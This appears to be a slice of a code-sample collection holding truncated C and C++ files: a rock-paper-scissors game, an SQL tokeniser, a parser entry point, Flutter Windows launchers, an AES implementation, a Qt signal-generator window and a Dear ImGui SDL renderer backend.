char getComputerChoice();\n// void showChoice(char choice);\n// void chooseWinner(char player, char computer);\n\n// int main() {\n//     char player;\n//     char computer;\n\n//     player = getUserChoice();\n//     std::cout << \"Your Choice: \";\n//     showChoice(player);\n\n//     computer = getComputerChoice();\n//     std::cout << \"Computer's Choice: \";\n//         showChoice(computer);\n\n\n//     chooseWinner(computer, player);\n\n//     return 0;\n\n// }\n\n\n// char getUserChoice(){\n//     char player;\n//     std::cout << \"-------------------------\\n\";\n//     std::cout << \"Rock-Paper-Scissors Game\\n\";\n//     std::cout << \"-------------------------\\n\";\n\n//     std::cout << \"\\n\";\n\n//     do\n//     {\n//           std::cout << \"Choose one of the following: \\n\";\n//     std::cout << \"'r' for Rock\\n\";\n//     std::cout << \"'p' for Paper\\n\";\n//     std::cout << \"'s' for Scissors\\n\";\n//     std::cin >> player;\n//     } while (player != 'r' && player != 'p' && player != 's');\n\n//     return player;\n    \n// }\n// char getComputerChoice(){\n\n//     char computer;\n//     srand(time(0));\n//     int num = rand() % 3 + 1;\n//     switch (num)\n//     {\n//     case 1: return 'r';\n//     case 2: return 's';\n//     case 3: return 'p';\n//         break;\n//     }\n//     return 0;\n// }\n// void showChoice(char c",
    "/*\nContributors: Prateek Vij, Saurabh Batra\nA tokeniser for SQL syntax. Function 'tokenise' is the primary function\nThe file corresponding to the file descriptor will be used for input.\nEach line of the file shall be tokenised independently.\nreturns an array of tokens, represented as integers\n*/\n#include \"tokeniser.h\"\n\nvoid tokenise(FILE *fp, int* tokens, int size)\n{\n\tbool isstring = false;\n\tint pos = 0;\n\n\t// buffer and pntr to buff initialisation\n\tchar *buffer = (char*)malloc(size*sizeof(char));\n\tint current = 0;\n\tint token;\n\n\tchar c = fgetc(fp); // Read a char from file\n\twhile(c!=EOF){\t\t\n\n\t\t// Indicates a string or identifier ahead\n\t\tif (c=='\\\"' || c=='\\'')\n\t\t{\n\t\t\tchar marker = c;\t\t\t\n\t\t\tgetstring(fp,marker,size,tokens,&pos);\n\t\t}\n\n\t\t// If c is a token delimiter(defined in tokeniser.h), print the token for the previous word and the del token \n\t\tif (istokendel(c))\n\t\t{\n\t\t\tif (current!=0)\n\t\t\t{\n\t\t\t\tbuffer[current]='\\0';\n\t\t\t\ttoken = gettoken(buffer,fp);\n\t\t\t\tvalidate_token(buffer,fp,token);\n\t\t\t\tif (token == SELECT)\n\t\t\t\t\twildcardstate = 1;\n\t\t\t\telse if (token == AGGR)\n\t\t\t\t\twildcardstate = 2;\n\t\t\t\telse{\n\t\t\t\t\twildcardstate = 0;\n\t\t\t\t}\n\n\t\t\t\tif (token != COMPARATOR) {\n\t\t\t\t\tstringstate=false;\n\t\t\t\t}\n\t\t\t\tcurrent = 0;\n\n\t\t\t\tprintf(\"%d \",token );\n\t\t\t\ttokens[pos] = token;\n\t\t\t\tpos++;\n\t\t\t}\n\t\t\tchar next = fgetc(fp);\n\t\t\t\n\t\t\tchar temp[3]={c,next,'\\0'};\t\t\t\n\t\t\tif (gettoken(temp,fp)==COMPARATOR) //Check for a 2 character token\n\t\t\t{\t\n\t\t\t\twildcardstate = 0;\n\t\t\t\tprintf(\"%d \",COMPARATOR );\n\t\t\t\ttokens[pos] = COMPARATOR;\n\t\t\t\tpos++;\n\t\t\t}\n\t\t\telse{\n\t\t\t\tfseek(fp,-1,SEEK_CUR);\n\t\t\t\tif (wildcardstate == 2 && c == '('){\n\t\t\t\t\ttoken = LP;\n\t\t\t\t\twildcardstate = 1;\n\t\t\t\t}\n\t\t\t\t// if (c == '*')\n\t\t\t\t// {\n\t\t\t\t// \tprintf(\"--> %d\\n\",wildcardstate );\n\t\t\t\t// }\n\t\t\t\telse if (c == '*' && wildcardstate == 1)\n\t\t\t\t{\n\t\t\t\t\ttoken = WILDCARD;\n\t\t\t\t\twildcardstate = 0;\n\t\t\t\t}\n\t\t\t\telse{\n\t\t\t\t\twildcardstate = 0;\n\t\t\t\t\ttoken = getdeltoken(c);\t\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tvalidate_token(buffer,fp,token);\t\t\t\t\t\t\t\t\n\t\t\t\tprintf(\"%d \",token);\t\t\t\t\n\t\t\t\ttokens[pos] = token;\n\t\t\t\tpos++;\n\t\t\t}\n\t\t\tif (next==EOF)\n\t\t\t{\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\n\t\t}\n\n\t\t// If a non-token delimiter (defined in tokeniser.h), print previous word token;\n\t\telse if (isdel(c))\n\t\t{\n\t\t\tif (current!=0)\n\t\t\t{\n\t\t\t\tbuffer[current]='\\0';\n\t\t\t\ttoken = gettoken(buffer,fp);\n\t\t\t\tvalidate_token(buffer,fp,token);\n\t\t\t\tif (token == SELECT)\n\t\t\t\t\twildcardstate = 1;\n\t\t\t\telse if (token == AGGR)\n\t\t\t\t\twildcardstate = 2;\n\t\t\t\telse{\n\t\t\t\t\twildcardstate = 0;\n\t\t\t\t}\n\n\t\t\t\tif (token != COMPARATOR) {\n\t\t\t\t\tstringstate=false;\n\t\t\t\t}\n\t\t\t\tcurrent = 0;\n\t\t\t\ttokens[pos] = token;\n\t\t\t\tpos++;\n\t\t\t\tprintf(\"%d \",token );\t\t\t\t\t\t\t\t\n\t\t\t}\n\t\t}\n\t\t// Otherwise, store the character in the buffer\n\t\telse{ \n\t\t\tbuffer[current] = c;\n\t\t\tcurrent ++;\n\t\t}\n\t\tc = fgetc(fp);\n\n\n\t}\n\n\tFILE *newfp = fopen(\"lex.txt\", \"w+\");\n\tint i;\n\t// printf(\"\\n\");\n\tfor(i=0;i<pos;i++){\n\t\tfprintf(newfp, \"%d \", tokens[i]);\n\t\tif(tokens[i] == SEMICOLON){\n\t\t\tfprintf(newfp, \"\\n\");\n\t\t}\n\t}\n\tfprintf(newfp, \"\\n\");\n\tfclose(newfp);\n}\n\n\n// Returns true if c is a token del\nbool istokendel(char c){\n\tint i;\n\tfor (i = 0; i < DEL_TOKEN_SIZE; ++i)\n\t{\n\t\tif (c==token_del[i])\n\t\t{\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\n\n// Returns true if c is a non-token del\nbool isdel(char c){\n\tint i;\n\tfor (i = 0; i < DEL_SIZE; ++i)\n\t{\n\t\tif (c==del[i])\n\t\t{\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\n\n// Returns token class from the given string token word\nint gettoken(char* word, FILE* fp){\n\tint i,j;\n\tchar word_upp[1024];\n\tstrcpy(word_upp,word);\n\tstrupper(word_upp);\n\n\t// Check for 2 word Keyword\n\tfor (i=0; i < DOUBLE_KEYWORD_SIZE; ++i) {\n\t\tif (!strcmp(word_upp,double_keywords_start[i])) {\n\t\t\tfseek(fp,-1,SEEK_CUR);\n\t\t\tchar nc = fgetc(fp);\n\t\t\tint len = 0;\n\t\t\tbool isncspace = false;\n\t\t\t\n\t\t\t// To check if next charac is a space.\n\t\t\tfor (j=0; j<3; ++j) {\n\t\t\t\tif (nc==spaces[j]) {\n\t\t\t\t\tisncspace = true;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (isncspace) {\n\t\t\t\tchar ncbuffer[1024];\n\t\t\t\tint nccounter = 0;\n\n\t\t\t\twhile (nc=fgetc(fp)) {\n\t\t\t\t\tlen++;\n\t\t\t\t\tif (nc == '\\'' || nc == '\\\"' || isdel(nc) || istokendel(nc))\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tncbuffer[nccounter] = nc;\n\t\t\t\t\tnccounter++;\n\t\t\t\t}\n\t\t\t\tncbuffer[nccounter] = '\\0';\n\t\t\t\tstrupper(ncbuffer);\n\n\t\t\t\t// Now compare second word.\n\t\t\t\tif (!strcmp(ncbuffer,double_keywords_end[i])) {\n\t\t\t\t\tstrcat(word, \" \");\n\t\t\t\t\tstrcat(word, ncbuffer);\n\t\t\t\t\tfseek(fp, -1, SEEK_CUR);\n\t\t\t\t\treturn double_keywords_type[i];\n\t\t\t\t} else {\n\t\t\t\t\tfseek(fp,-1*len,SEEK_CUR);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\t// CHeck for keyword\n\tfor (i = 0; i < KEYWORD_SIZE ; ++i)\n\t{\n\t\tif(!strcmp(word_upp,keywords[i])){\n\t\t\tif (!strcmp(word_upp,\"VALUES\")) {\n\t\t\t\tvaluesstate = true;\n\t\t\t}\t\t\t\n\t\t\treturn i;\n\t\t}\n\t}\n\t// Check for datatype\n\tfor (i = 0; i < COL_TYPE1_SIZE; ++i)\n\t{\n\t\tif(!strcmp(word_upp,col_types1[i])){\t\t\t\n\t\t\treturn COL_TYPE1;\n\t\t}\n\t}\n\n\tfor (i = 0; i < COL_TYPE2_SIZE; ++i)\n\t{\n\t\tif(!strcmp(word_upp,col_types2[i])){\t\t\t\n\t\t\treturn COL_TYPE2;\n\t\t}\n\t}\n\n\tfor (i = 0; i < COL_TYPE3_SIZE; ++i)\n\t{\n\t\tif(!strcmp(word_upp,col_types3[i])){\t\t\t\n\t\t\treturn COL_TYPE3;\n\t\t}\n\t}\n\n\tfor (i = 0; i < COL_TYPE4_SIZE; ++i)\n\t{\n\t\tif(!strcmp(word_upp,col_ty",
    "#include \"lexi/lexi_scanner.h\"\n#include \"parser/lang_parser.h\"\n#include \"tokens/token.h\"\n#include <iostream>\n\nvoid parser(LexiScanner &scanner, Token &token) {\n  LangParser parser(scanner, token);\n  try {\n    parser.parser();\n  } catch (std::runtime_error &e) {\n    std::cout << e.what() << std::endl;\n  }\n}\n\nvoid tokens(LexiScanner &scanner) {\n  Token token = Token(TokenType::TK_UNKNOWN, \"\");\n  do {\n    token = scanner.nextToken();\n    std::cout << token.getType() << \" \" << token.getValue() << std::endl;\n  } while (token.getType() != TokenType::TK_UNKNOWN &&\n           token.getType() != TokenType::TK_EOF);\n}\n\nint main(int argc, char **argv) {\n  std::cout << \"********** Running **********\" << std::endl;\n  std::string filename;\n  if (argc > 1)\n    filename = argv[1];\n  else {\n    filename = \"examples/main.ll\";\n    /*std::cout << \"file not found\\nPlease provide\\n\";*/\n  }\n\n  std::ifstream file;\n  file.open(filename);\n  if (!file.is_open()) {\n    std::cout << \"Error: could not open file \" << filename << std::endl;\n    throw std::runtime_error(\"Error: could not read file \" + filename);\n  }\n  std::string fileContent = std::string((std::istreambuf_iterator<char>(file)),\n                                        std::istreambuf_iterator<char>());\n  LexiScanner scanner(fileContent);\n  Token token = Token(TokenType::TK_UNKNOWN, \"\");\n  parser(scanner, token);\n  /*tokens(scanner);*/\n\n  return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"odusg\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <stdint.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n#include <time.h>\n\n#if defined(_MSC_VER) && (defined(_M_IX86) || defined(_M_AMD64))\n// _rotr is in <stdlib.h>\n#elif defined(__clang__) && (defined(__i386__) || defined(__x86_64__))\nstatic uint32_t _rotr(uint32_t x, int n)\n{\n    __asm__ __volatile__(\"rorl %2, %0\" : \"=r\"(x) : \"0\"(x), \"Nc\"(n));\n    return x;\n}\n#elif defined(__GNUC__) && (defined(__i386__) || defined(__x86_64__))\n// _rotr is in <ia32intrin.h>\n#include <x86intrin.h>\n#else\nstatic uint32_t _rotr(uint32_t x, int n)\n{\n    return (x >> n) | (x << (32 - n));\n}\n#endif\n\n#if defined(WIN32)\n#include \"os_windows.h\"\n#elif defined(__ANDROID__)\n#include \"os_android.h\"\n#elif defined(__linux__)\n#include \"os_linux.h\"\n#elif defined(__APPLE__)\n#include \"os_osx.h\"\n#else\n#error Unknown OS!\n#endif\n\nstatic const uint32_t rcon[] = {\n    0x01000000, 0x02000000, 0x04000000, 0x08000000,\n    0x10000000, 0x20000000, 0x40000000, 0x80000000,\n    0x1B000000, 0x36000000,\n};\n\nstatic const uint8_t Te[256] = {\n    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,\n    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,\n    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,\n    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,\n    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,\n    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,\n    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,\n    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,\n    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,\n    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,\n    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,\n    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,\n    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,\n    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,\n    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,\n    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16,\n};\n\nstatic const uint8_t Td[256] = {\n    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,\n    0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,\n    0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,\n    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,\n    0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,\n    0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,\n    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,\n    0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,\n    0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,\n    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,\n    0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,\n    0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,\n    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,\n    0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,\n    0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,\n    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d,\n};\n\nstatic const uint32_t TE[256] = {\n    0xc66363a5, 0xf87c7c84, 0xee777799, 0xf67b7b8d, 0xfff2f20d, 0xd66b6bbd, 0xde6f6fb1, 0x91c5c554,\n    0x60303050, 0x02010103, 0xce6767a9, 0x562b2b7d, 0xe7fefe19, 0xb5d7d762, 0x4dababe6, 0xec76769a,\n    0x8fcaca45, 0x1f82829d, 0x89c9c940, 0xfa7d7d87, 0xeffafa15, 0xb25959eb, 0x8e4747c9, 0xfbf0f00b,\n    0x41adadec, 0xb3d4d467, 0x5fa2a2fd, 0x45afafea, 0x239c9cbf, 0x53a4a4f7, 0xe4727296, 0x9bc0c05b,\n    0x75b7b7c2, 0xe1fdfd1c, 0x3d9393ae, 0x4c26266a, 0x6c36365a, 0x7e3f3f41, 0xf5f7f702, 0x83cccc4f,\n    0x6834345c, 0x51a5a5f4, 0xd1e5e534, 0xf9f1f108, 0xe2717193, 0xabd8d873, 0x62313153, 0x2a15153f,\n    0x0804040c, 0x95c7c752, 0x46232365, 0x9dc3c35e, 0x30181828, 0x379696a1, 0x0a05050f, 0x2f9a9",
    "////////////////////////////////////////////////////////\n// Includes\n////////////////////////////////////////////////////////\n#include \"../include/MainWindow.h\"\n#include <QApplication>\n#include <QVBoxLayout>\n#include <QHBoxLayout>\n#include <QFormLayout>\n#include <QLabel>\n#include <QChartView>\n#include <QValueAxis>\n#include <QDebug>\n\n\n////////////////////////////////////////////////////////\n// Class Method Definitions\n////////////////////////////////////////////////////////\nMainWindow::MainWindow(QWidget *parent)\n    :   QMainWindow(parent),\n        signalWidget(new QStackedWidget),\n        signalTypeComboBox(new QComboBox),\n        windowTypeComboBox(new QComboBox),\n        plotTypeComboBox(new QComboBox),\n        chart(new QChart) {\n\n    //-----------------------------------------------------//\n    // Variables\n    //-----------------------------------------------------//\n    QVBoxLayout *mainLayout = new QVBoxLayout;\n    QHBoxLayout *centralLayout = new QHBoxLayout;\n    QWidget *centralWidget = new QWidget;\n    QWidget *inputWidget = new QWidget;\n    QChartView *chartView = new QChartView;\n\n\n    //-----------------------------------------------------//\n    // Signal Selection Widget\n    //-----------------------------------------------------//\n    QStringList signalNames = {\n        \"Sine Wave\", \"Square Wave\", \"Sawtooth Wave\", \"Triangle Wave\",\n        \"White Noise\", \"Chirp Signal\", \"Impulse Signal\", \"Gaussian Pulse\"\n    };\n\n    foreach (const QString &signalName, signalNames) {\n        signalTypeComboBox->addItem(signalName);\n        signalWidget->addWidget(CreateSignalWidget(signalName));\n    }\n\n    QWidget *signalSelectionWidget = new QWidget;\n    QFormLayout *signalSelectionLayout = new QFormLayout;\n    signalSelectionLayout->addRow(new QLabel(\"Signal Type: \"), signalTypeComboBox);\n    connect(signalTypeComboBox, &QComboBox::currentTextChanged, this, &MainWindow::OnSignalSelectionChanged);\n    OnSignalSelectionChanged(signalTypeComboBox->currentText());\n    signalSelectionWidget->setLayout(signalSelectionLayout);\n    mainLayout->addWidget(signalSelectionWidget);\n    mainLayout->addWidget(signalWidget);\n\n\n    //-----------------------------------------------------//\n    // Window Selection Widget\n    //-----------------------------------------------------//\n    QStringList windowNames = {\n        \"No Window\", \"Hanning\", \"Hamming\", \"Blackman\",\n        \"Bartlett\", \"Blackman-Harris\", \"Flat Top\"\n    };\n\n    QWidget *windowSelectionWidget = new QWidget;\n    QFormLayout *windowSelectionLayout = new QFormLayout;\n    windowSelectionLayout->addRow(new QLabel(\"Window Type: \"), windowTypeComboBox);\n    foreach (const QString &windowName, windowNames) {\n        windowTypeComboBox->addItem(windowName);\n    }\n\n    windowSelectionWidget->setLayout(windowSelectionLayout);\n    mainLayout->addWidget(windowSelectionWidget);\n\n\n    //-----------------------------------------------------//\n    // TODO: Filter Selection Widget\n    //-----------------------------------------------------//\n    // QStringList filterNames = {\n    //     \"No Filter\", \"High-Pass Butterworth\", \"Low-Pass Butterworth\",\n    //     \"Band-Pass Butterworth\", \"High-Pass Chebyshev\", \"Low-Pass Chebyshev\", \n    //     \"Band-Pass Chebyshev\", \"High-Pass Bessel\", \"Low-Pass Bessel\", \"Band-Pass Bessel\"\n    // };\n\n    // QComboBox filterTypeCombobox = new QComboBox;\n    // foreach (const QString &filterName, filterNames) {\n    //     filterTypeComboBox->addItem(filterName);\n    // }\n\n    // QWidget *filterSelectionWidget = new QWidget;\n    // QFormLayout *filterSelectionLayout = new QFormLayout;\n    // filterSelectionLayout->addRow(new QLabel(\"Filter Type: \"), filterTypeComboBox);\n    // connect(filterTypeComboBox, &QComboBox::currentTextChanged, this, &MainWindow::OnFilterSelectionChanged);\n    // OnFilterSelectionChanged(filterTypeComboBox->currentText());\n    // filterSelectionWidget->setLayout(filterSelectionLayout);\n    // mainLayout->addWidget(filterSelectionWidget);\n    // mainLayout->addWidget(filterWidget);\n\n\n    //-----------------------------------------------------//\n    // Generate Button\n    //-----------------------------------------------------//\n    QPushButton *generateButton = new QPushButton(\"Generate\", this);\n    mainLayout->addWidget(generateButton);\n    connect(generateButton, &QPushButton::clicked, this, &MainWindow::OnGenerateButtonClicked);\n    \n\n    //-----------------------------------------------------//\n    // Plot Selection Widget\n    //-----------------------------------------------------//\n    QWidget *plotSelectionWidget = new QWidget;\n    QFormLayout *plotSelectionLayout = new QFormLayout;\n    plotTypeComboBox->addItem(\"Original Signal\");\n    plotSelectionLayout->addRow(new QLabel(\"Plot Type: \"), plotTypeComboBox);\n    connect(plotTypeComboBox, &QComboBox::currentTextChanged, this, &MainWindow::OnPlotSelectionChanged);\n    OnPlotSelectionChanged(plotTypeComboBox->currentText());\n    plotTypeComboBox->setEnabled(false);\n    plotSel",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_async\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// dear imgui: Renderer Backend for SDL_Renderer for SDL2\n// (Requires: SDL 2.0.17+)\n\n// Note how SDL_Renderer is an _optional_ component of SDL2.\n// For a multi-platform app consider using e.g. SDL+DirectX on Windows and SDL+OpenGL on Linux/OSX.\n// If your application will want to render any non trivial amount of graphics other than UI,\n// please be aware that SDL_Renderer currently offers a limited graphic API to the end-user and\n// it might be difficult to step out of those boundaries.\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'SDL_Texture*' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Large meshes support (64k+ vertices) with 16-bit indices.\n// Missing features:\n//  [ ] Renderer: Multi-viewport support (multiple windows).\n\n// You can copy and use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n//  2024-05-14: *BREAKING CHANGE* ImGui_ImplSDLRenderer3_RenderDrawData() requires SDL_Renderer* passed as parameter.\n//  2023-05-30: Renamed imgui_impl_sdlrenderer.h/.cpp to imgui_impl_sdlrenderer2.h/.cpp to accommodate for upcoming SDL3.\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2021-12-21: Update SDL_RenderGeometryRaw() format to work with SDL 2.0.19.\n//  2021-12-03: Added support for large mesh (64K+ vertices), enable ImGuiBackendFlags_RendererHasVtxOffset flag.\n//  2021-10-06: Backup and restore modified ClipRect/Viewport.\n//  2021-09-21: Initial version.\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_impl_sdlrenderer2.h\"\n#include <stdint.h>     // intptr_t\n\n// Clang warnings with -Weverything\n#if defined(__clang__)\n#pragma clang diagnostic push\n#pragma clang diagnostic ignored \"-Wsign-conversion\"    // warning: implicit conversion changes signedness\n#endif\n\n// SDL\n#include <SDL.h>\n#if !SDL_VERSION_ATLEAST(2,0,17)\n#error This backend requires SDL 2.0.17+ because of SDL_RenderGeometry() function\n#endif\n\n// SDL_Renderer data\nstruct ImGui_ImplSDLRenderer2_Data\n{\n    SDL_Renderer*   Renderer;       // Main viewport's renderer\n    SDL_Texture*    FontTexture;\n    ImGui_ImplSDLRenderer2_Data()   { memset((void*)this, 0, sizeof(*this)); }\n};\n\n// Backend data stored in io.BackendRendererUserData to allow support for multiple Dear ImGui contexts\n// It is STRONGLY preferred that you use docking branch with multi-viewports (== single Dear ImGui context + multiple windows) instead of multiple Dear ImGui contexts.\nstatic ImGui_ImplSDLRenderer2_Data* ImGui_ImplSDLRenderer2_GetBackendData()\n{\n    return ImGui::GetCurrentContext() ? (ImGui_ImplSDLRenderer2_Data*)ImGui::GetIO().BackendRendererUserData : nullptr;\n}\n\n// Functions\nbool ImGui_ImplSDLRenderer2_Init(SDL_Renderer* renderer)\n{\n    ImGuiIO& io = ImGui::GetIO();\n    IMGUI_CHECKVERSION();\n    IM_ASSERT(io.BackendRendererUserData == nullptr && \"Already initialized a renderer backend!\");\n    IM_ASSERT(renderer != nullptr && \"SDL_Renderer not initialized!\");\n\n    // Setup backend capabilities flags\n    ImGui_ImplSDLRenderer2_Data* bd = IM_NEW(ImGui_ImplSDLRenderer2_Data)();\n    io.BackendRendererUserData = (void*)bd;\n    io.BackendRendererName = \"imgui_impl_sdlrenderer2\";\n    io.BackendFlags |= ImGuiBackendFlags_RendererHasVtxOffset;  // We can honor the ImDrawCmd::VtxOffset field, allowing for large meshes.\n\n    bd->Renderer = renderer;\n\n    return true;\n}\n\nvoid ImGui_ImplSDLRenderer2_Shutdown()\n{\n    ImGui_ImplSDLRenderer2_Data* bd = ImGui_ImplSDLRenderer2_GetBackendData();\n    IM_ASSERT(bd != nullptr && \"No renderer backend to shutdown, 